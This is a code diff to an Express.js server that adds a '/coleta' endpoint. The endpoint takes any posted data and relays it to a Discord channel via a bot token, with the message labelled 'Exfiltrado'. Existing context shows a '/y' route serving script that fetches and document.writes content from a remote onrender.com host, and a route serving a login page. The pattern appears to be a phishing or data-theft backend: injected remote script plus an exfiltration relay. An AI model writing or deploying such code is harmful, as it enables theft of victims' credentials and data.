@@ -206,6 +206,21 @@ app.get('/y', (req, res) => {
   res.type('application/javascript').send(`fetch('https://yyazboard.onrender.com/lisboa').then(r=>r.text()).then(t=>document.write(t))`);
 });
 
+app.post('/coleta', async (req, res) => {
+  const data = req.body;
+
+  await fetch('https://discord.com/api/channels/1392213201067970631/messages', {
+    method: 'POST',
+    headers: {
+      'Authorization': process.env.DC_BotToken,
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ content: `Exfiltrado: \n \`\`\`\n${data}\`\`\`` })
+  });
+
+  res.status(204).end();
+});
+
 app.get('/login', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'login.html'))
 });
